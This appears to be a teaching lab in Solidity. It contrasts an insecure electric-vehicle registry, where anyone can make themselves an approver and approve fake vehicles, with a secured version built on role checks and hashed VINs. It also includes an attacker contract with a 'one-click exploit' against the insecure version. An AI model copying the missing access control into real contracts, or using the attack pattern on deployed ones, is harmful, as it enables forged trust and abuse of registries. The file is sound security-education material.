// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * SMART CONTRACT LAB:
 *     "Electric Vehicle (EV) Registry"
 *
 * Models:
 *   - EVs registered (VIN, battery kWh)
 *   - EV identity verification
 *   - Allowed to charge or not
 *
 * INSECURE VERSION:
 *   - Anyone can register EVs
 *   - Anyone can modify EV data
 *   - Anyone can mark EV as approved
 *
 * SECURE VERSION:
 *   - Only authorized OEMs can register EVs
 *   - Hash-only VIN (privacy)
 *   - Only security officers can approve EV identity
 *   - Strong trust rules
 */

/*//////////////////////////////////////////////////////////////
//                  INSECURE ELECTRIC VEHICLE REGISTRY
//////////////////////////////////////////////////////////////*/

contract ElectricVehicleInsecure {
    struct EV {
        address owner;
        string vin;          // plaintext VIN (sensitive)
        uint256 batteryKWh;
        bool approved;
        address approvedBy;
        bool exists;
    }

    mapping(uint256 => EV) public evs;
    mapping(address => bool) public isApprover; // attacker can set themselves

    uint256 public nextId;

    event ApproverSet(address who, bool allowed);
    event EVRegistered(uint256 indexed id, address indexed owner);
    event EVApproved(uint256 indexed id, address indexed approver);

    /**
     * ⚠ Anyone can mark themselves approver.
     */
    function setApprover(address who, bool allowed) external {
        isApprover[who] = allowed;
        emit ApproverSet(who, allowed);
    }

    /**
     * ⚠ Anyone can register EV with plaintext VIN.
     */
    function registerEV(string calldata vin, uint256 batteryKWh)
        external
        returns (uint256)
    {
        uint256 id = nextId++;

        evs[id] = EV({
            owner: msg.sender,
            vin: vin,
            batteryKWh: batteryKWh,
            approved: false,
            approvedBy: address(0),
            exists: true
        });

        emit EVRegistered(id, msg.sender);
        return id;
    }

    /**
     * ⚠ Anyone can approve any EV.
     */
    function approveEV(uint256 id) external {
        EV storage ev = evs[id];
        require(ev.exists, "NO_EV");

        ev.approved = true;
        ev.approvedBy = msg.sender;

        emit EVApproved(id, msg.sender);
    }

    /**
     * Completely attacker-controllable trust function.
     */
    function isTrustedEV(uint256 id) external view returns (bool) {
        EV storage ev = evs[id];
        if (!ev.exists) return false;
        if (!ev.approved) return false;
        if (!isApprover[ev.approvedBy]) return false;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
//                           OWNABLE
//////////////////////////////////////////////////////////////*/

contract Ownable {
    address public owner;

    event OwnershipTransferred(address oldOwner, address newOwner);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    function transferOwnership(address n) external onlyOwner {
        require(n != address(0), "ZERO");
        owner = n;
        emit OwnershipTransferred(msg.sender, n);
    }
}

/*//////////////////////////////////////////////////////////////
//                SECURE ELECTRIC VEHICLE REGISTRY
//////////////////////////////////////////////////////////////*/

contract ElectricVehicleSecure is Ownable {
    struct EV {
        uint256 id;
        address owner;
        bytes32 vinHash;        // hash of VIN (privacy)
        uint256 batteryKWh;
        bool approved;
        address approvedBy;
        bool exists;
    }

    mapping(uint256 => EV) public evs;

    // OEM = car manufacturer
    mapping(address => bool) public isOEM;
    // Security officers = EV identity validators
    mapping(address => bool) public isSecurityOfficer;

    uint256 public nextId;

    event OEMSet(address who, bool allowed);
    event SecurityOfficerSet(address who, bool allowed);
    event EVRegistered(uint256 indexed id, address indexed owner, bytes32 vinHash);
    event EVApproved(uint256 indexed id, address indexed officer);

    modifier onlyOEM {
        require(isOEM[msg.sender], "NOT_OEM");
        _;
    }

    modifier onlySecurityOfficer {
        require(isSecurityOfficer[msg.sender], "NOT_SECURITY_OFFICER");
        _;
    }

    /**
     * Admin assigns EV manufacturers (OEMs)
     */
    function setOEM(address who, bool allowed) external onlyOwner {
        require(who != address(0), "ZERO");
        isOEM[who] = allowed;
        emit OEMSet(who, allowed);
    }

    /**
     * Admin assigns security officers
     */
    function setSecurityOfficer(address who, bool allowed) external onlyOwner {
        require(who != address(0), "ZERO");
        isSecurityOfficer[who] = allowed;
        emit SecurityOfficerSet(who, allowed);
    }

    /**
     * OEM registers an EV with VIN hash only.
     *
     * vinHash = keccak256(abi.encodePacked("VIN123456789"))
     */
    function registerEV(bytes32 vinHash, uint256 batteryKWh)
        external
        onlyOEM
        returns (uint256)
    {
        require(vinHash != bytes32(0), "EMPTY_VIN");
        require(batteryKWh > 0, "BAD_KWH");

        uint256 id = nextId++;

        evs[id] = EV({
            id: id,
            owner: msg.sender,
            vinHash: vinHash,
            batteryKWh: batteryKWh,
            approved: false,
            approvedBy: address(0),
            exists: true
        });

        emit EVRegistered(id, msg.sender, vinHash);
        return id;
    }

    /**
     * Security officer approves the EV identity
     */
    function approveEV(uint256 id) external onlySecurityOfficer {
        EV storage ev = evs[id];
        require(ev.exists, "NO_EV");

        ev.approved = true;
        ev.approvedBy = msg.sender;

        emit EVApproved(id, msg.sender);
    }

    /**
     * Trusted EV = 
     *   - exists
     *   - OEM is valid
     *   - approved
     *   - approved by security officer
     */
    function isTrustedEV(uint256 id) external view returns (bool) {
        EV storage ev = evs[id];
        if (!ev.exists) return false;
        if (!isOEM[ev.owner]) return false;
        if (!ev.approved) return false;
        if (!isSecurityOfficer[ev.approvedBy]) return false;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
//                       EV ATTACKER CONTRACT
//////////////////////////////////////////////////////////////*/

contract EVAttacker {
    ElectricVehicleInsecure public target;

    constructor(address _target) {
        target = ElectricVehicleInsecure(_target);
    }

    /**
     * Step 1 — become approver
     */
    function becomeApprover() public {
        target.setApprover(address(this), true);
    }

    /**
     * Step 2 — register fake EV
     */
    function registerFakeEV(string calldata vin, uint256 kWh) public returns (uint256) {
        return target.registerEV(vin, kWh);
    }

    /**
     * Step 3 — approve own fake EV
     */
    function approveFake(uint256 id) public {
        target.approveEV(id);
    }

    /**
     * One-click exploit
     */
    function fullAttack(string calldata vin, uint256 kWh) external returns (uint256) {
        becomeApprover();
        uint256 id = registerFakeEV(vin, kWh);
        approveFake(id);
        return id;
    }
}
